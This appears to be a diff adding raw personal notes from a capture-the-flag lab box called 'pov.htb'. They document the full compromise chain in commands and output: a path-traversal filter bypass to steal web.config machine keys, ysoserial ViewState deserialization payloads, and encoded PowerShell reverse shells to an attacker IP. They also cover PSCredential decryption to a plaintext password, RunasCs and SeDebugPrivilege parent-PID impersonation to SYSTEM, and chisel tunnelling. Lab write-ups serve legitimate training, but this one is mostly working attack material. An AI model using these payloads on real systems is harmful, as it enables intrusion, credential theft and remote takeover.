@@ -1,0 +1,330 @@
+10.10.11.251
+
+
+- User:
+	- fuzz subdomain
+	- Download CV contain path-travel ==> read code
+	- Read download index.aspx.cs ==> bypass filter ==> read web.config
+	- web.config ==> vewistate deserialization ==> Rce
+	- Read connection.xml ==> converse to clear text password ==> runascs.exe(better runas.exe) ==> shell => user.txt
+- Root:
+	- SeDebugPriv
+	- Manual:
+		- Using: https://github.com/decoder-it/psgetsystem
+		- tasklist to get winlogin.exe pid 
+		- Need evil-winrm or revssh shell to run
+		- . .\psgetsys.ps1; ImpersonateFromParentPid -ppid 552 -command 'c:\temp\rev443.exe'
+		- SYSTEM shell
+	- Auto:
+		- msf meterpreter
+		- migrate 552
+		- SYSTEM shell
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+└─$ nmap -sCV -Pn -p- --open 10.10.11.251 -o pov-nmap    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 14:39 +07
+Nmap scan report for 10.10.11.251
+Host is up (0.16s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: pov.htb
+| http-methods: 
+|_  Potentially risky methods: TRACE
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 536.62 seconds
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+- 80 X-AspNet-Version: 4.0.30319
+	dirsearch -u http://pov.htb -e "*" -r
+	wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.pov.htb" --hc 403,400,301 {--hl 198} -t 50 10.10.11.251
+	
+	
+	dirsearch -u http://dev.pov.htb/ -e "*" -r
+	dirsearch -u http://dev.pov.htb/portfolio/ -e "*" -r
+		- download
+			- path travel ( */portfolio/ ) ** bingo
+				file=C:\Windows\win.ini
+				c:\Windows\System32\Drivers\etc\hosts 127.0.0.1   pov.htb dev.pov.htb
+				contact.aspx
+				
+				index.aspx.cs ==> filePath = Regex.Replace(filePath, "../", ""); ==> ....//web.config (bypass)
+				....//web.config
+					    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
+				 try this: https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#what-is-viewstate
+				
+			 
+		- post email
+			- 
+			
+			
+			
+			
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+X-AspNet-Version: 4.0.30319
+/portfolio/contact.aspx
+/web.config
+
+
+
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/UserName"
+
+./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/$env:UserName' --generator=8E0F0FA3 --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+--generator = {__VIWESTATEGENERATOR parameter value}
+
+
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/UserName" --generator=37310E71 — decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/UserName" --path=”/portfolio/contact.aspx” --apppath=”/” — decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+10.10.11.251 - - [31/May/2024 16:00:28] code 404, message File not found
+10.10.11.251 - - [31/May/2024 16:00:28] "GET /UserName HTTP/1.1" 404 -
+
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.14/UserName" --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+
+
+msfconsole -q -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST 10.10.16.14;set LPORT 443;run;"
+
+powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c ”powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=” --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+
+./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ”powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=” --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+
+pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000
+
+
+PS C:\users\sfitz\documents> cat connection.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+
+$Credential = Import-Clixml -Path C:\users\sfitz\documents\connection.xml
+
+$password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR(01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6))
+
+PS C:\users\sfitz\documents> $Credential.GetNetworkCredential() | fl
+
+
+UserName       : alaading
+Password       : f8gQ8fynP44ek1m3
+SecurePassword : System.Security.SecureString
+Domain         : 
+
+alaading f8gQ8fynP44ek1m3
+
+$secpasswd = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -AsPlainText -Force;
+$mycreds = New-Object System.Management.Automation.PSCredential ("alaading", $secpasswd);
+$computer = 10.10.11.251;
+$computer = "pov";
+
+[System.Diagnostics.Process]::Start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=", $mycreds.Username, $mycreds.Password, $computer);
+
+[System.Diagnostics.Process]::Start("C:\temp\rev443.exe", "", $mycreds.Username, $mycreds.Password, $computer);
+
+[System.Diagnostics.Process]::Start("C:\temp\revssh.exe", "", $mycreds.Username, $mycreds.Password, $computer);
+
+
+$password = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("alaading", $password)
+Enter-PSSession -ComputerName POV -Credential $cred
+
+
+runas.exe /user:alaading 'c:\temp\rev443.exe'
+
+runas /user:alaading 'c:\temp\rev443.exe' < “c:\temp\pass.txt”
+
+./reverse-ssh -v -l -p 8888
+./revssh.exe -p 8888 10.10.16.14
+./revssh.exe -p 22 kali@10.10.16.14
+ssh -p 8888 127.0.0.1
+
+
+$username = 'alaading'; $password = 'f8gQ8fynP44ek1m3'; $computername='10.10.11.251'; <# winrs #> 
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;New-PSSession -ComputerName $computername -Credential $credential;
+
+Enter-PSSession 1  <# 1 is PSsession id #> 
+
+
+./accesschk.exe /accepteula -uwdqs sfitz c:\
+./accesschk.exe -uwdqs "Authenticated Users" c:\
+./accesschk.exe -uwdqs "Everyone" c:\
+./accesschk.exe -uwqs pov\sfitz c:\*.*
+
+
+$username = 'alaading'
+$password = 'f8gQ8fynP44ek1m3'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object Automation.PSCredential($username, $securePassword)
+Invoke-Command -ComputerName localHost -Credential $credential -ScriptBlock{C:\temp\rev443.exe} 
+
+
+https://github.com/antonioCoco/RunasCs ==> better runas.exe
+
+wget 10.10.16.12:8000/RunasCs.exe
+
+./RunasCs.exe alaading f8gQ8fynP44ek1m3 "cmd /c whoami /all"
+
+./RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\temp\rev443.exe"
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+https://github.com/antonioCoco/RunasCs ==> better runas.exe
+
+./RunasCs.exe alaading f8gQ8fynP44ek1m3 "cmd /c whoami /all"
+
+./RunasCs.exe alaading f8gQ8fynP44ek1m3 "C:\temp\rev443.exe"
+
+
+.\TokenDump.exe -e -H -d
+
+744
+
+.\TokenDump.exe -e -H -d -p 744
+
+.\TokenDump.exe -e -a system -d
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+./accesschk.exe /accepteula -uwdqs alaading c:\*
+
+ W c:\Windows\System32\Tasks ==> ?
+ W c:\Windows\SysWOW64\Tasks ==> ?
+
+
+    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
+    RmSvc: GenericExecute (Start/Stop)
+
+
+wget 10.10.16.12:8000/PrivescCheck.ps1 -o PrivescCheck.ps1
+
+
+PS C:\temp> . ./psgetsys.ps1
+. ./psgetsys.ps1
+PS C:\temp> Get-Process winlogon
+Get-Process winlogon
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+    255      12     2676      16484       0.17    548   1 winlogon 
+	
+	
+[MyProcess]::CreateProcessFromParent("548","c:\windows\system32\cmd.exe", "/c c:\temp\rev443.exe")
+
+[MyProcess]::CreateProcessFromParent("548","c:\temp\rev443.exe", "")
+
+import-module ./psgetsys.ps1; [MyProcess]::CreateProcessFromParent("548","c:\windows\system32\cmd.exe", "/c c:\temp\rev443.exe")
+alaading f8gQ8fynP44ek1m3
+
+#usage: ipmo psgetsys.ps1;  ImpersonateFromParentPid -ppid <parent pid> -command <command to execute> -cmdargs <command arguments>
+ImpersonateFromParentPid -ppid <parent pid> -command <command to execute> -cmdargs <command arguments>
+ImpersonateFromParentPid -ppid 552 -command 'c:\temp\rev443.exe' -cmdargs ''
+552
+
+.\psgetsys.ps1 552 c:\temp\rev443.exe
+
+
+Get-Process -Id $PID
+
+
+.\psgetsys.ps1 548 c:\temp\rev443.exe
+
+import-module psgetsys.ps1;  [MyProcess]::CreateProcessFromParent(548,c:\temp\rev443.exe)
+[MyProcess]::CreateProcessFromParent(548,"c:\temp\rev443.exe")
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+chisel server --port 9999 --reverse
+./chisel.exe client 10.10.16.7:9999 R:socks
+
+
+./SeDebugPrivesc1.exe 548 'c:\windows\system32\cmd.exe /c c:\temp\rev443.exe'
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+<configuration>
+  <system.web>
+    <customErrors mode="On" defaultRedirect="default.aspx" />
+    <httpRuntime targetFramework="4.5" />
+    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
+  </system.web>
+    <system.webServer>
+        <httpErrors>
+            <remove statusCode="403" subStatusCode="-1" />
+            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
+        </httpErrors>
+        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
+    </system.webServer>
+</configuration>
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+why --path=”/portfolio/contact.aspx” --apppath=”/” work but generator not ??? did i use it wrong ?
+
+
+./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.2/UserName" --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+PSObject, TextFormattingRunProperties and TypeConfuseDelegate
+
+./ysoserial.exe -p ViewState -g PSObject -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.2/UserName" --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" #==> not work
+
+
+./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.2/UserName" --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.2/UserName" --generator=37310E71 --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --isdebug --islegacy
+
+./ysoserial.exe -p ViewState -g WindowsIdentity -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.17/UserName" --path=”/portfolio/contact.aspx” --apppath=”/” --decryptionalg=”AES” --decryptionkey=”74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg=”SHA1" --validationkey=”5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+
+--isdebug --islegacy to guess --path --apppath 
+
+WindowsIdentity
+
+
+https://medium.com/@Strange0/windows-privilege-escalation-abusing-user-privileges-c7532831cb84
+https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege
+
+
+
+sfitz
+alaading
+
+GetNPUsers.py -no-pass -dc-ip 10.10.11.251 pov.htb/sfitz
+GetNPUsers.py -no-pass -dc-ip 10.10.11.251 pov.htb/alaading
+
